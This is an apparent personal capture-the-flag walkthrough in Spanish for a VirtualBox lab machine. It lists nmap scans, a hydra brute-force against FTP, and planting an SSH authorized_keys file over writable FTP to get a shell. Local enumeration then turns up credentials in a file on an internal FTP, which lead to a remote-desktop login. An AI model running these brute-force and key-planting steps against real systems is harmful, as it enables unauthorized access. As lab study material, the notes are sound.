User.txt

Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )

Nos aparecen dos servicios ftp, uno en el puerto 21 y otro en el 2121. 
No podemos conectarnos a ninguno con el usuario anonymous.

Probamos hacer un hydra:
    - hydra -L diccionarios/names.txt -P diccionarios/passwords.txt IP ftp -s PORT

Obtenemos un usuario y contrase単a para conectarnos:
    - ftp IP -p 2121
    - dir o ls 
    - quit
Parece el patth de un usuario. Probamos a conectarnos por ssh con claves publica ay privada:
    - ssh-keygen
    - cat id_rsa.pub > authorized_keys
    - Nos conectamos al ftp:
        - ftp IP -p 2121
        - Creamos la carpeta .ssh -> mkdir .ssh 
        - A単adimos el authorized_keys -> put authorized_keys PONER BN LSO COMADNOS 

Nos conectamos por ssh:
    - ssh -i id_rsa username@IP 
Enumeracion:
    - netstat -a 
    - ftp -> open 127.0.0.1 21 -> usuario = anonymous sin contrase単a
    - dir o ls 
    - get file.txt
    - quit

type file.txt y tenemos un usuario y contrase単a para conectarnos. Nos conectamos con rdesktop.
